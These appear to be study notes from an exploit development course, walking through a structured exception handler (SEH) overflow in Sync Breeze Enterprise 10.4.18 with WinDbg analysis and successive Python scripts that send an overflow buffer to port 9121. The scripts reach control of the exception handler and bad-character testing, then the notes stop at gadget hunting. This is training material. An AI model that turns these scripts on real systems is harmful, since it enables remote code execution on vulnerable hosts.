# 4. Exploiting SEH Overflows

## Installing the Sync Breeze Application

```bash
C:\Installers\seh_overflow\syncbreezeent_setup_v10.4.18.exe
```

### Crashing Sync Breeze

```bash
python seh_overflow_0x01.py 172.16.69.147
```

### Analyzing the Crash in WinDbg

```bash
# The EAX register is overwritten
(17f8.1984): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for C:\Program Files\Sync Breeze 
Enterprise\bin\libpal.dll
eax=41414141 ebx=0192fa1c ecx=0192ff18 edx=0192f9d4 esi=0192ff18 edi=0192fb20
eip=00882a9d esp=0192f9a8 ebp=0192fec8 iopl=0 nv up ei pl nz na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206
libpal!SCA_ConfigObj::Deserialize+0x1d:
00882a9d ff5024 call dword ptr [eax+24h] ds:0023:41414165=????????
# View the stack and we see more code in other places
dds esp L30
# If we resume the application
g
# We end up overwriting the EIP
(17f8.1984): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling. 
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=41414141 edx=770a3b20 esi=00000000 edi=00000000
eip=41414141 esp=0192f438 ebp=0192f458 iopl=0 nv up ei pl zr na pe nc
```

### Introduction to Structured Exception Handling

### Understanding SEH

{% code overflow="wrap" %}
```bash
# Dump the TEB structure inside WinDbg
dt nt!_TEB
ntdll!_TEB
+0x000 NtTib : _NT_TIB
+0x01c EnvironmentPointer : Ptr32 Void
+0x020 ClientId : _CLIENT_ID
+0x028 ActiveRpcHandle : Ptr32 Void
+0x02c ThreadLocalStoragePointer : Ptr32 Void
+0x030 ProcessEnvironmentBlock : Ptr32 _PEB
+0x034 LastErrorValue : Uint4B
+0x038 CountOfOwnedCriticalSections : Uint4B
+0x03c CsrClientThread : Ptr32 Void
+0x040 Win32ThreadInfo : Ptr32 Void
# the nt!_TEB structure starts with a nested structure called _NT_TIB
# Dumping _NT_TIB inside WinDbg shows that the first member in this structure is a pointer named ExceptionList
dt _NT_TIB
ntdll!_NT_TIB
+0x000 ExceptionList : Ptr32 _EXCEPTION_REGISTRATION_RECORD
+0x004 StackBase : Ptr32 Void
+0x008 StackLimit : Ptr32 Void
+0x00c SubSystemTib : Ptr32 Void
+0x010 FiberData : Ptr32 Void
+0x010 Version : Uint4B
+0x014 ArbitraryUserPointer : Ptr32 Void
+0x018 Self : Ptr32 _NT_TIB
# _EXCEPTION_REGISTRATION_RECORD structure contains two members: Next, which points to a _EXCEPTION_REGISTRATION_RECORD structure, and Handler, which points to an _EXCEPTION_DISPOSITION structure
dt _EXCEPTION_REGISTRATION_RECORD
+0x000 Next : Ptr32 _EXCEPTION_REGISTRATION_RECORD
+0x004 Handler : Ptr32 _EXCEPTION_DISPOSITION
# Dump the CONTEXT structure in WinDbg
dt ntdll!_CONTEXT
# the _except_handler function returns an _EXCEPTION_DISPOSITION structure. Inspecting this with WinDbg reveals that this structure contains the result of the exception handling process.
dt _EXCEPTION_DISPOSITION
ntdll!_EXCEPTION_DISPOSITION
 ExceptionContinueExecution = 0n0
 ExceptionContinueSearch = 0n1
 ExceptionNestedException = 0n2
 ExceptionCollidedUnwind = 0n3
```
{% endcode %}

### SEH Validation

### Structured Exception Handler Overflows

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"># After attaching the WinDbg to our process, we’ll obtain the TEB address with !teb,  which will contain the ExceptionList pointer
!teb
TEB at 7ffd8000
ExceptionList : 0132ff70
StackBase : 01330000
# Exception list at the almost at the bottom of the stack (Large overflow required).
# Dump the first _EXCEPTION_REGISTRATION_RECORD structure at the memory address specified in the ExceptionList member
dt _EXCEPTION_REGISTRATION_RECORD 0132ff70
# _EXCEPTION_REGISTRATION_RECORD structure has two members
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffcc
ntdll!_EXCEPTION_REGISTRATION_RECORD
: 0x0132ffe4 _EXCEPTION_REGISTRATION_RECORD
: 0x7728a380 _EXCEPTION_DISPOSITION
+0x000 Next
+0x004 Handler 
ntdll!_except_handler4+0
dt _EXCEPTION_REGISTRATION_RECORD 0x0132ffe4
ntdll!_EXCEPTION_REGISTRATION_RECORD
+0x000 Next : 0xffffffff _EXCEPTION_REGISTRATION_RECORD
+0x004 Handler : 0x77296c7c _EXCEPTION_DISPOSITION
ntdll!FinalExceptionHandlerPad12+0
# The end of the singly-linked list is marked by the 0xffffffff value stored by the last _EXCEPTION_REGISTRATION_RECORD Next member. This last record is the default exception handler specified by the operating system.
# Allow application to continue execution
g
# Run exploit
python3 seh_overflow_0x01.py 192.168.120.10
# Walk the ExceptionList
!teb
dt _EXCEPTION_REGISTRATION_RECORD 01c4fe1c
dt _EXCEPTION_REGISTRATION_RECORD 0x01c4ff54
+0x000 Next : 0x41414141 _EXCEPTION_REGISTRATION_RECORD
+0x004 Handler : 0x41414141 _EXCEPTION_DISPOSITION +41414141
# Exception Handler overwritten
# Display exception handlers of current thread
!exchain
# At this point, however, the address of at least one of the _except_handler functions has been overwritten by our buffer (0x41414141). This means that whenever this _EXCEPTION_REGISTRATION_RECORD structure is used to handle the exception, the CPU will end up calling 0x41414141, giving us control over the EIP register. This is exactly the behavior we noticed as part of the initial crash analysis.
g
# Inspect the call stack to determine which functions were called before the EIP register was overwritten.
k
ChildEBP RetAddr
WARNING: Frame IP not in any known module. Following frames may be wrong. 
00 01c4f434 77383b02 0x41414141
1 . 0 1c4f458 77383ad4 ntdll!ExecuteHandler2+0x26
# The output indicates that ntdll!ExecuteHandler2 was called directly before we achieved code execution. As previously discussed, this function is responsible for calling the _except_handler functions registered on the stack. We’ll confirm this shortly.
# We can list all the registers within WinDbg to determine if any of them point to our buffer:
r
dds esp La
# Restart WinDbg
# Attach to process as admin
# Set breakpoint on executehandler
bp ntdll!ExecuteHandler2
# Resume application
g
# After hitting the breakpoint for the second time inspect the assembly code of the executing function
<strong>u @eip L11
</strong><strong>
</strong>


</code></pre>

### Gaining Code Execution

{% code overflow="wrap" %}
```bash
# Confirm crash
# Find offset
msf-pattern_create -l 1000
```
{% endcode %}

Updated exploit seh\_overflow\_0x02.py

{% code overflow="wrap" %}
```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B" 

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```
{% endcode %}

```bash
# Find the offset
!exchain
0155fe1c: libpal!md5_starts+149fb (005fdf5b)
0155ff54: 33654132
# Use msf-pattern_offset to find exact number
msf-pattern_offset -l 1000 -q 33654132
```

Updated exploit seh\_overflow\_0x03.py

```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= b"\x43" * (size - len (inputBuffer))

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

```bash
# Analyze in WinDbg
!exchain
0190fe0c: libpal!md5_starts+149fb (008fdf5b)
0190ff44: 42424242
Invalid exception stack at 41414141
```

### Detecting Bad Characters

Updated exploit seh\_overflow\_0x04.py



```python
#!/usr/bin/python
import socket
import sys
from struct import pack

try:
  server = sys.argv[1]
  port = 9121
  size = 1000

  badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d"
    b"\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a"
    b"\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27"
    b"\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34"
    b"\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41"
    b"\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e"
    b"\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b"
    b"\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68"
    b"\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    b"\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
    b"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
    b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c"
    b"\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9"
    b"\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6"
    b"\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3"
    b"\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd"
    b"\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea"
    b"\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7"
    b"\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

  inputBuffer = b"\x41" * 128
  inputBuffer+= b"\x42\x42\x42\x42"
  inputBuffer+= badchars

  inputBuffer+= b"\x43" * (size - len (inputBuffer))

  header =  b"\x75\x19\xba\xab"
  header += b"\x03\x00\x00\x00"
  header += b"\x00\x40\x00\x00"
  header += pack('<I', len(inputBuffer))
  header += pack('<I', len(inputBuffer))
  header += pack('<I', inputBuffer[-1])

  buf = header + inputBuffer

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buf)
  s.close()

  print("Done!")

except socket.error:
  print("Could not connect!")
```

{% code overflow="wrap" %}
```bash
# Run exploit
python seh_overflow_0x04.py 172.16.69.147
# In debugger continue program
g
# We can now dump the bytes (db) pointed to by the second argument (EstablisherFrame) passed to the _except_handler function. We can get this argument from the stack at offset 0x08 from ESP:
0:001> dds esp L5
0077ee00  77ef5d12 ntdll!ExecuteHandler2+0x26
0077ee04  0077ef00
0077ee08  0077ff44
0077ee0c  0077ef1c
0077ee10  0077ee8c
0:001> db 0077ff44
0077ff44  41 41 41 41 42 42 42 42-01 00 00 00 ec 07 7c 00  AAAABBBB......|.
0077ff54  10 3e 7c 00 a8 5f e4 00-72 40 7c 00 80 ed b8 00  .>|.._..r@|.....
0077ff64  a8 5f e4 00 24 3e 7c 00-80 ed b8 00 10 3e 7c 00  ._..$>|......>|.
0077ff74  09 d1 7d 77 a8 5f e4 00-f0 d0 7d 77 dc ff 77 00  ..}w._....}w..w.
0077ff84  ed 24 e7 77 a8 5f e4 00-c6 c1 bc f6 00 00 00 00  .$.w._..........
0077ff94  00 00 00 00 a8 5f e4 00-00 00 00 00 00 00 00 00  ....._..........
0077ffa4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
0077ffb4  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

```
{% endcode %}

### Finding a P/P/R Instruction Sequence



{% code overflow="wrap" %}
```bash
# Check the DllCharacteristics member of each module and provide details about the protections in place.
.load narly
# Output a list of all loaded modules and their memory protections
!nmod
# Shows that libssp.dll has no protections and no null characters in the address
# Retrieve the start and end address of libssp.dll
lm m libspp
# Next, we must gather all possible opcodes for the POP instructions for each x86 register, excluding the stack pointer (ESP). We will also need the opcode for the ret instruction. Let’s use the msf-nasm_s he ll utility to collect this information.
msf-nasm_shell
```
{% endcode %}
